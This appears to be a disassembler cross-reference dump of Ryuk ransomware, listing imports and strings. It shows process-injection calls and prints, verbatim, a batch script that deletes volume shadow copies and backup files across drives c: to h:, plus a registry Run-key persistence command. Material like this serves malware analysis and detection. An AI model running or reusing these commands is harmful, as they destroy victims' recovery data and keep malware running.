reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x1400024e3	0x1400180a0	import	0x140002270	KERNEL32.dll.CloseHandle
0x1400024f1	0x140018068	import	0x140002270	KERNEL32.dll.Process32NextW
0x140002512	0x1400180a0	import	0x140002270	KERNEL32.dll.CloseHandle
0x14000257b	0x1400180b0	import	0x140002550	KERNEL32.dll.GetWindowsDirectoryW
0x14000259f	0x14001ff30	string	0x140002550	\Documents and Settings\Default User\sys
0x1400025fa	0x14001ff88	string	0x140002550	\users\Public\sys
0x14000261a	0x140018118	import	0x140002550	KERNEL32.dll.SetLastError
0x140002645	0x1400180f8	import	0x140002550	KERNEL32.dll.CreateFileW
0x14000264e	0x140018060	import	0x140002550	KERNEL32.dll.GetLastError
0x14000265c	0x1400180a0	import	0x140002550	KERNEL32.dll.CloseHandle
0x140002697	0x1400180f8	import	0x140002550	KERNEL32.dll.CreateFileW
0x1400026ed	0x140018118	import	0x1400026d0	KERNEL32.dll.SetLastError
0x1400026fd	0x140018048	import	0x1400026d0	KERNEL32.dll.OpenProcess
0x140002719	0x140018098	import	0x1400026d0	KERNEL32.dll.GetModuleHandleA
0x14000273a	0x140018118	import	0x1400026d0	KERNEL32.dll.SetLastError
0x140002759	0x1400180c0	import	0x1400026d0	KERNEL32.dll.VirtualAllocEx
0x140002767	0x140018060	import	0x1400026d0	KERNEL32.dll.GetLastError
0x140002780	0x1400180a0	import	0x1400026d0	KERNEL32.dll.CloseHandle
0x1400027ad	0x1400182e0	import	0x1400026d0	KERNEL32.dll.WriteProcessMemory
0x1400027ba	0x1400180a0	import	0x1400026d0	KERNEL32.dll.CloseHandle
0x1400027cf	0x1400180e8	import	0x1400026d0	KERNEL32.dll.VirtualFreeEx
0x1400027fe	0x1400180e0	import	0x1400026d0	KERNEL32.dll.CreateRemoteThread
0x140002809	0x140018060	import	0x1400026d0	KERNEL32.dll.GetLastError
0x140002812	0x1400180a0	import	0x1400026d0	KERNEL32.dll.CloseHandle
0x140002827	0x1400180e8	import	0x1400026d0	KERNEL32.dll.VirtualFreeEx
0x1400028d8	0x14001ffb0	string	0x140002870	RyukReadMe.txt
0x140002912	0x140018118	import	0x140002870	KERNEL32.dll.SetLastError
0x14000295a	0x140029500	string	0x140002870	<!0\vw>
0x140002ac5	0x14001ffd0	string	0x140002a10	\System32\cmd.exe
0x140002b8c	0x140020000	string	0x140002a10	\Documents and Settings\Default User\
0x140002bdc	0x140020050	string	0x140002a10	\users\Public\
0x140002c2e	0x140002c41	string	0x140002a10	fD95)
0x140002ca2	0x14001fdf8	string	0x140002a10	PUBLIC
0x140002d88	0x140005300	string	0x140002a10	@USVWH
0x140002da7	0x140005300	string	0x140002a10	@USVWH
0x1400036da	0x140005300	string	0x140002a10	@USVWH
0x1400037d5	0x140029a30	string	0x140002a10	/3*\e>
0x140003800	0x140024a10	string	0x140002a10	/3*\e>
0x140003b28	0x140020078	string	0x1400039d0	keystorage2
0x140003b64	0x140029a30	string	0x1400039d0	/3*\e>
0x140003b7f	0x140029a30	string	0x1400039d0	/3*\e>
0x140003baa	0x140029a30	string	0x1400039d0	/3*\e>
0x140003bd5	0x140024a10	string	0x1400039d0	/3*\e>
0x140003bfa	0x140024a10	string	0x1400039d0	/3*\e>
0x140003c25	0x140024a10	string	0x1400039d0	/3*\e>
0x140003c50	0x140024a10	string	0x1400039d0	/3*\e>
0x140003c79	0x140024a10	string	0x1400039d0	/3*\e>
0x140003c94	0x140024a10	string	0x1400039d0	/3*\e>
0x140003cbb	0x140024a10	string	0x1400039d0	/3*\e>
0x140003ce2	0x140024a10	string	0x1400039d0	/3*\e>
0x14000412c	0x140024a80	string	0x1400039d0	UNIQUE_ID_DO_NOT_REMOVE
0x14000428b	0x140029a30	string	0x1400039d0	/3*\e>
0x1400042b2	0x140024a10	string	0x1400039d0	/3*\e>
0x140004418	0x14001fdf8	string	0x140004310	PUBLIC
0x14000447b	0x1400039d0	string	0x140004310	@USAVH
0x1400044e8	0x140029a30	string	0x1400044b0	/3*\e>
0x140004503	0x140029a30	string	0x1400044b0	/3*\e>
0x140004532	0x140029a30	string	0x1400044b0	/3*\e>
0x14000456f	0x140024a10	string	0x1400044b0	/3*\e>
0x14000458a	0x140024a10	string	0x1400044b0	/3*\e>
0x1400045b5	0x140024a10	string	0x1400044b0	/3*\e>
0x1400045e0	0x140024a10	string	0x1400044b0	/3*\e>
0x1400061b9	0x140005300	string	0x140005300	@USVWH
0x140006666	0x1400046f0	string	0x140005300	@USWAVH
0x1400068a1	0x1400293c4	string	0x140006830	lTGg_
0x1400068fe	0x1400280d0	string	0x140006830	.5(\r
0x140006aab	0x1400299a0	string	0x140006830	>/:\f#
0x140006aeb	0x14002a428	string	0x140006830	>\t=\b#
0x140006cab	0x140029a30	string	0x140006830	/3*\e>
0x140006ced	0x140024a10	string	0x140006830	/3*\e>
0x140006fe2	0x140018078	import	0x140006830	KERNEL32.dll.LoadLibraryA
0x140006ff2	0x1400280d0	string	0x140006830	.5(\r
0x140006ff9	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007023	0x140028cec	string	0x140006830	\r6,ZcL>%
0x14000704b	0x1400200c0	string	0x140006830	Iphlpapi.dll
0x140007066	0x1400200d0	string	0x140006830	GetLastError
0x140007074	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000708f	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400070aa	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400070b7	0x1400285b2	string	0x140006830	&?%\f%\a
0x1400070c5	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400070d2	0x1400288a0	string	0x140006830	%?=-#\v,,=(
0x1400070d9	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400070e6	0x140028454	string	0x140006830	%?=*>
0x1400070f4	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007101	0x14002883c	string	0x140006830	%?=:%
0x140007108	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007115	0x140028166	string	0x140006830	$3'\r
0x14000711c	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007137	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007144	0x140028b5c	string	0x140006830	%?=<"\a(\a\b<\a\e
0x140007152	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007166	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007173	0x1400281ca	string	0x140006830	55>_e0??\f#
0x140007181	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000718e	0x1400283f0	string	0x140006830	!(,\b%\a\n;
0x140007195	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400071c1	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400071ce	0x140028648	string	0x140006830	%?=?4
0x1400071dc	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400071e9	0x14002851c	string	0x140006830	55>_e&3:\b3
0x1400071f0	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400071fd	0x1400200e0	string	0x140006830	GetSystemDefaultLangID
0x140007204	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007211	0x140028b8e	string	0x140006830	%?=<"\a(\a\b<\a\r
0x140007218	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007225	0x1400285e4	string	0x140006830	0?(\r
0x14000722c	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007239	0x140028c24	string	0x140006830	0?.8$\a(0?0
0x140007247	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000725b	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007268	0x140028cba	string	0x140006830	0?.:4
0x140007276	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007283	0x140028c56	string	0x140006830	0?.*=\r),"4\e
0x14000728a	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000729e	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400072ab	0x14002880a	string	0x140006830	1?=/8
0x1400072b2	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400072bf	0x140028710	string	0x140006830	53',)\a9
0x1400072cd	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400072e1	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400072f5	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007302	0x140028742	string	0x140006830	16,\f!
0x140007310	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000731d	0x1400287a6	string	0x140006830	%?=*$
0x14000732b	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000733f	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000734c	0x140028616	string	0x140006830	%?=/8
0x14000735a	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007367	0x1400284b8	string	0x140006830	%6&\v0
0x140007375	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007382	0x1400286de	string	0x140006830	$3'\r
0x140007390	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000739d	0x1400200f8	string	0x140006830	WaitForMultipleObjects
0x1400073ab	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400073b8	0x140028198	string	0x140006830	%?=$>
0x1400073bf	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400073d3	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400073e0	0x1400283be	string	0x140006830	%?=$>
0x1400073e7	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400073f4	0x1400284ea	string	0x140006830	%?=$>
0x1400073fb	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007408	0x14002822e	string	0x140006830	!(,\b%\a
0x14000740f	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000741c	0x140020110	string	0x140006830	GetFileSizeEx
0x140007423	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000743e	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000744b	0x1400287d8	string	0x140006830	%?=%>
0x140007459	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007474	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007481	0x140028bf2	string	0x140006830	0?.&!\a4
0x14000748f	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400074a3	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400074b0	0x1400282c4	string	0x140006830	%?=>8\f>&
0x1400074be	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400074cb	0x14002854e	string	0x140006830	1?=/8
0x1400074d9	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400074e6	0x140028bc0	string	0x140006830	0?.&!\a4
0x1400074ed	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400074fa	0x1400281fc	string	0x140006830	1?=/8
0x140007501	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000750e	0x14002886e	string	0x140006830	%?==8
0x14000751c	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007529	0x14002867a	string	0x140006830	%?=/8
0x140007530	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000753d	0x140028134	string	0x140006830	$3'\r
0x140007544	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000755f	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000756c	0x140020120	string	0x140006830	MoveFileExW
0x14000757a	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000758e	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400075a9	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400075bd	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400075d1	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400075de	0x140020130	string	0x140006830	SetFilePointerEx
0x1400075ec	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007607	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007614	0x140028486	string	0x140006830	$(,\f
0x14000761b	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007628	0x14002838c	string	0x140006830	!(,\b%\a\n;
0x140007636	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007643	0x1400282f6	string	0x140006830	!(,\b%\a
0x14000764a	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007657	0x140020148	string	0x140006830	CreateThread
0x14000765e	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007672	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000767f	0x140028d50	string	0x140006830	!5\n\e4
0x14000768d	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x14000769a	0x140028328	string	0x140006830	!(,\b%\a
0x1400076a1	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400076ae	0x1400286ac	string	0x140006830	%?=/8
0x1400076bc	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400076d0	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x1400076dd	0x140028c88	string	0x140006830	0?.-4
0x1400076eb	0x1400180b8	import	0x140006830	KERNEL32.dll.GetProcAddress
0x140007790	0x1400180f0	import	0x140007720	KERNEL32.dll.GetVersionExW
0x1400079e3	0x1400293c4	string	0x1400077c0	lTGg_
0x140007a36	0x140020160	string	0x1400077c0	vssadmin Delete Shadows /all /quiet\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded\r\nvssadmin Delete Shadows /all /quiet\r\ndel /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk\r\ndel /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk\r\ndel /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk\r\ndel /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk\r\ndel /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk\r\ndel /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk\r\ndel %0
0x140007d19	0x140020758	string	0x140007d00	kernel32.dll
0x140007d28	0x140018078	import	0x140007d00	KERNEL32.dll.LoadLibraryA
0x140007d39	0x140020768	string	0x140007d00	IsWow64Process
0x140007d68	0x1400180b8	import	0x140007d00	KERNEL32.dll.GetProcAddress
0x140007d76	0x140018108	import	0x140007d00	KERNEL32.dll.GetCurrentProcess
0x140007d89	0x1400180d8	import	0x140007d00	KERNEL32.dll.FreeLibrary
0x140007dee	0x1400180b0	import	0x140007db0	KERNEL32.dll.GetWindowsDirectoryW
0x140007e5a	0x14001ffd0	string	0x140007db0	\System32\cmd.exe
0x140007e8d	0x140018100	import	0x140007db0	KERNEL32.dll.GetModuleFileNameW
0x140007e93	0x140020780	string	0x140007db0	/C REG ADD "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "svchos" /t REG_SZ /d "
0x140007ff6	0x140020850	string	0x140007db0	" /f
0x140008066	0x140020860	string	0x140007db0	/reg:64
0x140008099	0x1400182f8	import	0x140007db0	SHELL32.dll.ShellExecuteW
0x14000810f	0x140018170	import	0x140008104	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008118	0x140018168	import	0x140008104	KERNEL32.dll.UnhandledExceptionFilter
0x14000811e	0x140018108	import	0x140008104	KERNEL32.dll.GetCurrentProcess
0x140008131	0x140018178	import	0x140008104	KERNEL32.dll.TerminateProcess
0x14000815d	0x14000832c	string	0x140008104	@SVWH
0x1400082c9	0x140018150	import	0x1400082bc	KERNEL32.dll.RtlCaptureContext
0x1400082e1	0x140018158	import	0x1400082bc	KERNEL32.dll.RtlLookupFunctionEntry
0x140008318	0x140018160	import	0x1400082bc	KERNEL32.dll.RtlVirtualUnwind
0x140008337	0x140018150	import	0x14000832c	KERNEL32.dll.RtlCaptureContext
0x140008351	0x140018158	import	0x14000832c	KERNEL32.dll.RtlLookupFunctionEntry
0x140008388	0x140018160	import	0x14000832c	KERNEL32.dll.RtlVirtualUnwind
0x1400088ec	0x1400181a0	import	0x1400088c0	KERNEL32.dll.GetSystemTimeAsFileTime
0x1400088fa	0x140018198	import	0x1400088c0	KERNEL32.dll.GetCurrentThreadId
0x140008906	0x140018190	import	0x1400088c0	KERNEL32.dll.GetCurrentProcessId
0x140008916	0x140018188	import	0x1400088c0	KERNEL32.dll.QueryPerformanceCounter
0x140008987	0x1400181a8	import	0x140008980	KERNEL32.dll.InitializeSListHead
0x140008a21	0x140018150	import	0x1400089dc	KERNEL32.dll.RtlCaptureContext
0x140008a3b	0x140018158	import	0x1400089dc	KERNEL32.dll.RtlLookupFunctionEntry
0x140008a7c	0x140018160	import	0x1400089dc	KERNEL32.dll.RtlVirtualUnwind
0x140008ad0	0x1400181b0	import	0x1400089dc	KERNEL32.dll.IsDebuggerPresent
0x140008af1	0x140018170	import	0x1400089dc	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008afc	0x140018168	import	0x1400089dc	KERNEL32.dll.UnhandledExceptionFilter
0x140008b40	0x1400181b8	import	0x140008b24	KERNEL32.dll.GetStartupInfoW
0x140008b66	0x1400181c0	import	0x140008b60	KERNEL32.dll.GetModuleHandleW
0x140008bbb	0x140018170	import	0x140008bb4	KERNEL32.dll.SetUnhandledExceptionFilter
0x140008ea5	0x140018100	import	0x140008e74	KERNEL32.dll.GetModuleFileNameW
0x140008ebd	0x140018060	import	0x140008e74	KERNEL32.dll.GetLastError
0x140008f01	0x1400183b8	string	0x140008e74	Main Invoked.
0x140008fbd	0x140018100	import	0x140008f8c	KERNEL32.dll.GetModuleFileNameW
0x140008fd5	0x140018060	import	0x140008f8c	KERNEL32.dll.GetLastError
0x140009019	0x1400183c8	string	0x140008f8c	Main Returned.
0x1400093e4	0x140018200	import	0x140009338	KERNEL32.dll.LoadLibraryExW
0x1400093f7	0x140018060	import	0x140009338	KERNEL32.dll.GetLastError
0x14000940a	0x140018200	import	0x140009338	KERNEL32.dll.LoadLibraryExW
0x140009447	0x1400180d8	import	0x140009338	KERNEL32.dll.FreeLibrary
0x14000947b	0x1400180b8	import	0x140009338	KERNEL32.dll.GetProcAddress
0x140009522	0x1400184a8	string	0x140009500	EventRegister
0x140009533	0x1400184a8	string	0x140009500	EventRegister
0x1400095b6	0x1400184c0	string	0x140009584	EventSetInformation
0x140009615	0x1400184d8	string	0x140009608	EventUnregister
0x140009628	0x1400184d8	string	0x140009608	EventUnregister
0x14000968f	0x1400184f0	string	0x14000965c	EventWriteTransfer
0x140009701	0x140018510	string	0x1400096f4	FlsAlloc
0x140009714	0x140018510	string	0x1400096f4	FlsAlloc
0x140009737	0x1400181e0	import	0x1400096f4	KERNEL32.dll.TlsAlloc
0x140009754	0x140018528	string	0x140009748	FlsFree
0x140009767	0x140018528	string	0x140009748	FlsFree
0x14000978b	0x1400181f8	import	0x140009748	KERNEL32.dll.TlsFree
0x1400097ae	0x140018548	string	0x14000979c	FlsSetValue
0x1400097b7	0x140018548	string	0x14000979c	FlsSetValue
0x1400097ed	0x1400181f0	import	0x14000979c	KERNEL32.dll.TlsSetValue
0x14000981b	0x140018560	string	0x140009804	InitializeCriticalSectionEx
0x14000982e	0x140018560	string	0x140009804	InitializeCriticalSectionEx
0x140009860	0x1400181d8	import	0x140009804	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x1400098d2	0x1400180d8	import	0x1400098b4	KERNEL32.dll.FreeLibrary
0x140009a5f	0x140018218	import	0x140009a40	KERNEL32.dll.DeleteCriticalSection
0x140009ad0	0x1400181c0	import	0x140009a9c	KERNEL32.dll.GetModuleHandleW
0x140009c3c	0x140018108	import	0x140009c14	KERNEL32.dll.GetCurrentProcess
0x140009c47	0x140018178	import	0x140009c14	KERNEL32.dll.TerminateProcess
0x140009c56	0x140018220	import	0x140009c14	KERNEL32.dll.ExitProcess
0x140009c77	0x140018ef8	string	0x140009c60	mscoree.dll
0x140009c80	0x140018228	import	0x140009c60	KERNEL32.dll.GetModuleHandleExW
0x140009c8f	0x140018f10	string	0x140009c60	CorExitProcess
0x140009c96	0x1400180b8	import	0x140009c60	KERNEL32.dll.GetProcAddress
0x140009cbb	0x1400180d8	import	0x140009c60	KERNEL32.dll.FreeLibrary
0x140009d7f	0x140009d86	string	0x140009d44	HcȺ\b blocks=Basic Latin,Latin Extended-B
0x140009ee4	0x140018208	import	0x140009ee0	KERNEL32.dll.EnterCriticalSection
0x140009ef0	0x140018210	import	0x140009eec	KERNEL32.dll.LeaveCriticalSection
0x14000a065	0x14000a09d	string	0x14000a014	E+BHI
0x14000a101	0x14000a13a	string	0x14000a0b0	E+BHI
0x14000a7dd	0x14000a7f8	string	0x14000a7d4	<Nu'
0x14000aac5	0x14000aad6	string	0x14000a950	E2\rA
0x14000aacf	0x14000aad6	string	0x14000a950	E2\rA
0x14000ac23	0x140018f7c	string	0x14000abcc	(null)
0x14000b1e6	0x140018f88	string	0x14000b198	(null)
0x14000b1ff	0x140018f7c	string	0x14000b198	(null)
